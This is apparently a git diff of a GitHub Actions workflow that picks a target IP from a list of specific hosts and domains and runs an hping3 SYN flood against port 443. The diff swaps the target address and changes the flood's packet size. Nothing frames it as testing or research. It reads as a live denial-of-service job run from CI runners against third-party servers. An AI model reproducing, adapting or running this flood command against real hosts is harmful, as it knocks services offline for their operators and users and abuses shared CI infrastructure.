@@ -78,7 +78,7 @@ jobs:
 
           # Alibaba
           # IP="80ym.com" # 8.210.147.180
-          IP="47.238.135.201"
+          IP="47.238.91.22"
           # IP="154.89.50.218" # www.enk7h.vip
           # IP="ngk86.vip"
           TIMEOUT=1
@@ -92,7 +92,8 @@ jobs:
               IP=$(dig +short "$IP" | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' | head -n 1)
           fi
 
-          sudo timeout $TIMEOUT hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 $IP || true
+          # sudo timeout $TIMEOUT hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 $IP || true
+          sudo timeout $TIMEOUT hping3 -S --flood -V -d 1400 -p 443 -s 1000-65535 $IP || true
 
       - name: 再次检查首个job完成时间
         if: always()
